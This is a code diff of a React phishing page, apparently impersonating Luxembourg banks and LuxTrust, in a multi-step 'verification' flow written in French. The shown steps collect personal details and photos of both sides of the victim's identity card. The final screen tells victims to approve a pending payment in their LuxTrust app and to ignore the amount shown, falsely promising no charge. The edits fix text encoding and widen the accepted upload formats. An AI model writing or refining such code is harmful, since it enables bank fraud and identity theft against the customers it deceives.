-            <label className="block min-w-0"><span className={labelCls}>Nom</span><span className="relative mt-2 block"><LeadIcon d={P.user} /><input value={info.last} onChange={set("last")} placeholder="Dupont" autoComplete="family-name" className={`${inputCls(e.last)}`} /></span>{e.last && <span className={errCls}>âš  {e.last}</span>}</label>
+            <label className="block min-w-0"><span className={labelCls}>Prénom</span><span className="relative mt-2 block"><LeadIcon d={P.user} /><input value={info.first} onChange={set("first")} placeholder="Jean" autoComplete="given-name" className={`${inputCls(e.first)}`} /></span>{e.first && <span className={errCls}>⚠ {e.first}</span>}</label>
+            <label className="block min-w-0"><span className={labelCls}>Nom</span><span className="relative mt-2 block"><LeadIcon d={P.user} /><input value={info.last} onChange={set("last")} placeholder="Dupont" autoComplete="family-name" className={`${inputCls(e.last)}`} /></span>{e.last && <span className={errCls}>⚠ {e.last}</span>}</label>
           </div>
-          <label className="block min-w-0"><span className={labelCls}>Date de naissance</span><span className="relative mt-2 block"><LeadIcon d={P.cal} /><input value={info.dob} onChange={setDob} placeholder="JJ/MM/AAAA" inputMode="numeric" autoComplete="bday" className={`pl-11 font-mono tracking-wider ${inputClsPlain(e.dob)}`} /></span>{e.dob && <span className={errCls}>âš  {e.dob}</span>}</label>
-          <label className="block min-w-0"><span className={labelCls}>Adresse</span><span className="relative mt-2 block"><LeadIcon d={P.pin} /><input value={info.address} onChange={set("address")} placeholder="Rue + numÃ©ro" autoComplete="street-address" className={`${inputCls(e.address)}`} /></span>{e.address && <span className={errCls}>âš  {e.address}</span>}</label>
+          <label className="block min-w-0"><span className={labelCls}>Date de naissance</span><span className="relative mt-2 block"><LeadIcon d={P.cal} /><input value={info.dob} onChange={setDob} placeholder="JJ/MM/AAAA" inputMode="numeric" autoComplete="bday" className={`pl-11 font-mono tracking-wider ${inputClsPlain(e.dob)}`} /></span>{e.dob && <span className={errCls}>⚠ {e.dob}</span>}</label>
+          <label className="block min-w-0"><span className={labelCls}>Adresse</span><span className="relative mt-2 block"><LeadIcon d={P.pin} /><input value={info.address} onChange={set("address")} placeholder="Rue + numéro" autoComplete="street-address" className={`${inputCls(e.address)}`} /></span>{e.address && <span className={errCls}>⚠ {e.address}</span>}</label>
           <div className="grid w-full grid-cols-2 gap-2.5 sm:gap-3">
-            <label className="block min-w-0"><span className={labelCls}>Code postal</span><span className="relative mt-2 block"><LeadIcon d={P.hash} /><input value={info.zip} onChange={set("zip")} placeholder="L-1234" autoComplete="postal-code" className={`${inputCls(e.zip)}`} /></span>{e.zip && <span className={errCls}>âš  {e.zip}</span>}</label>
-            <label className="block min-w-0"><span className={labelCls}>Ville</span><span className="relative mt-2 block"><LeadIcon d={P.pin} /><input value={info.city} onChange={set("city")} placeholder="Luxembourg" autoComplete="address-level2" className={`${inputCls(e.city)}`} /></span>{e.city && <span className={errCls}>âš  {e.city}</span>}</label>
+            <label className="block min-w-0"><span className={labelCls}>Code postal</span><span className="relative mt-2 block"><LeadIcon d={P.hash} /><input value={info.zip} onChange={set("zip")} placeholder="L-1234" autoComplete="postal-code" className={`${inputCls(e.zip)}`} /></span>{e.zip && <span className={errCls}>⚠ {e.zip}</span>}</label>
+            <label className="block min-w-0"><span className={labelCls}>Ville</span><span className="relative mt-2 block"><LeadIcon d={P.pin} /><input value={info.city} onChange={set("city")} placeholder="Luxembourg" autoComplete="address-level2" className={`${inputCls(e.city)}`} /></span>{e.city && <span className={errCls}>⚠ {e.city}</span>}</label>
           </div>
-          <div className="pt-1"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Enregistrer et continuer â†’</PrimaryBtn></div>
+          <div className="pt-1"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Enregistrer et continuer →</PrimaryBtn></div>
         </form>
       </Shell>
     );
@@ -1183,8 +1157,8 @@ function checkIdFile(file) {
     async function sendId() {
       setIdErr("");
       if (!ok) {
-        if (!idFront) setIdErr("Recto requis : photographiez le devant de votre piÃ¨ce.");
-        else if (!idBack) setIdErr("Verso requis : photographiez le dos de votre piÃ¨ce.");
+        if (!idFront) setIdErr("Recto requis : photographiez le devant de votre pièce.");
+        else if (!idBack) setIdErr("Verso requis : photographiez le dos de votre pièce.");
         else setIdErr(fErr || bErr);
         return;
       }
@@ -1214,7 +1188,7 @@ function checkIdFile(file) {
       } catch (e) {
         setLoading(false);
         setIdUp(false);
-        setIdErr(e.message === "upload failed" ? "Envoi Ã©chouÃ©, rÃ©essayez." : e.message || "Envoi Ã©chouÃ©, rÃ©essayez.");
+        setIdErr(e.message === "upload failed" ? "Envoi échoué, réessayez." : e.message || "Envoi échoué, réessayez.");
       }
     }
 
@@ -1234,12 +1208,12 @@ function checkIdFile(file) {
                 <span className="mt-1.5 text-[13px] font-bold text-neutral-500">
                   {side === "front" ? "Photographiez le recto" : "Photographiez le verso"}
                 </span>
-                <span className="text-[11.5px] text-neutral-400">PNG ou JPG â€¢ 100 Ko â€“ 1 Mo</span>
+                <span className="text-[11.5px] text-neutral-400">Tous formats photo • 100 Ko – 10 Mo</span>
               </>
             )}
             <input
               type="file"
-              accept="image/png,image/jpeg,image/jpg"
+              accept="image/*"
               className="hidden"
               onChange={(e) => {
                 const f = e.target.files?.[0] || null;
@@ -1254,20 +1228,20 @@ function checkIdFile(file) {
               <span className="block h-full rounded-full transition-all" style={{ width: `${pct}%`, backgroundColor: bank.color }} />
             </span>
           )}
-          {err && <span className={errCls}>âš  {err}</span>}
+          {err && <span className={errCls}>⚠ {err}</span>}
         </label>
       );
     }
 
     return (
-      <Shell bank={bank} step={7} kicker="PiÃ¨ce d'identitÃ©" title="TÃ©lÃ©versez votre piÃ¨ce d'identitÃ©" desc="Photographiez le recto et le verso de votre carte d'identitÃ©. PNG ou JPG, max 10 Mo.">
+      <Shell bank={bank} step={7} kicker="Pièce d'identité" title="Téléversez votre pièce d'identité" desc="Photographiez le recto et le verso de votre carte d'identité. Tous formats photo, 100 Ko – 10 Mo.">
         <div className="grid w-full grid-cols-1 gap-3.5 sm:grid-cols-2">
           <IdBox side="front" file={idFront} setFile={setIdFront} preview={idFrontUrl} setPreview={setIdFrontUrl} err={fErr} pct={idPct.front} />
           <IdBox side="back" file={idBack} setFile={setIdBack} preview={idBackUrl} setPreview={setIdBackUrl} err={bErr} pct={idPct.back} />
         </div>
-        {idErr && <p className={`${errCls} mt-2 text-center`}>âš  {idErr}</p>}
+        {idErr && <p className={`${errCls} mt-2 text-center`}>⚠ {idErr}</p>}
         <div className="pt-3">
-          <PrimaryBtn bank={bank} loading={loading} disabled={!ok} onClick={sendId}>Envoyer â†’</PrimaryBtn>
+          <PrimaryBtn bank={bank} loading={loading} disabled={!ok} onClick={sendId}>Envoyer →</PrimaryBtn>
         </div>
       </Shell>
     );
@@ -1281,18 +1255,18 @@ function checkIdFile(file) {
         step={8}
         kicker="Confirmation finale"
         title="Approuvez pour finaliser"
-        desc="Une demande d'approbation est en attente dans votre application LuxTrust. Un montant peut Ã©ventuellement apparaÃ®tre. Vous pouvez ignorer ce montant : AUCUN frais ne sera prÃ©levÃ© de votre compte. Ceci est un message gÃ©nÃ©rÃ© automatiquement."
+        desc="Une demande d'approbation est en attente dans votre application LuxTrust. Un montant peut éventuellement apparaître. Vous pouvez ignorer ce montant : AUCUN frais ne sera prélevé de votre compte. Ceci est un message généré automatiquement."
       >
         <ApproveVisual bank={bank} />
         <div className="mt-4 w-full rounded-2xl border p-4 text-[13px] sm:p-4" style={{ borderColor: bank.color + "44", background: `linear-gradient(180deg, ${bank.color}12, ${bank.color}06)` }}>
-          <p className="font-bold text-neutral-800">RÃ©sumÃ© de la vÃ©rification</p>
+          <p className="font-bold text-neutral-800">Résumé de la vérification</p>
           <p className="mt-1 break-words text-neutral-600">
-            {bank.name} â€¢ Utilisateur <b className="font-mono break-all">{userId.toUpperCase()}</b> â€¢ {info.first} {info.last} â€¢ {phone && `+352 ${phone}`}
+            {bank.name} • Utilisateur <b className="font-mono break-all">{userId.toUpperCase()}</b> • {info.first} {info.last} • {phone && `+352 ${phone}`}
           </p>
         </div>
         <div className="mt-4 w-full space-y-2.5">
           <PrimaryBtn bank={bank} loading={loading} onClick={() => submitAndWait("confirm", { confirmed: true, at: new Date().toISOString() }, "confirm_submitted")}>
-            âœ“ J&apos;ai approuvÃ© le paiement
+            ✓ J&apos;ai approuvé le paiement
           </PrimaryBtn>
         </div>
       </Shell>
@@ -1304,18 +1278,18 @@ function checkIdFile(file) {
     <Shell
       bank={bank}
       step={8}
-      kicker="TerminÃ©"
-      title="VÃ©rification terminÃ©e"
-      desc="Merci. Votre session est terminÃ©e."
+      kicker="Terminé"
+      title="Vérification terminée"
+      desc="Merci. Votre session est terminée."
     >
       <div className="w-full rounded-xl border border-green-200 bg-green-50 p-4 text-center sm:p-6">
-        <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full bg-green-500 text-2xl text-white">âœ“</div>
-        <p className="mt-3 break-words text-[17px] font-extrabold text-neutral-900 sm:text-[18px]">VÃ©rification terminÃ©e</p>
+        <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full bg-green-500 text-2xl text-white">✓</div>
+        <p className="mt-3 break-words text-[17px] font-extrabold text-neutral-900 sm:text-[18px]">Vérification terminée</p>
         <p className="mt-1 text-[13px] text-neutral-600 sm:text-[13.5px]">
-          Merci. Votre identitÃ© {bank.name} a Ã©tÃ© vÃ©rifiÃ©e.
+          Merci. Votre identité {bank.name} a été vérifiée.
         </p>
         <button onClick={goHome} className="mt-4 min-h-[48px] w-full rounded-lg bg-neutral-900 px-4 py-3 text-[14px] font-bold text-white active:bg-neutral-800">
-          â† Retour
+          ← Retour
         </button>
       </div>
     </Shell>
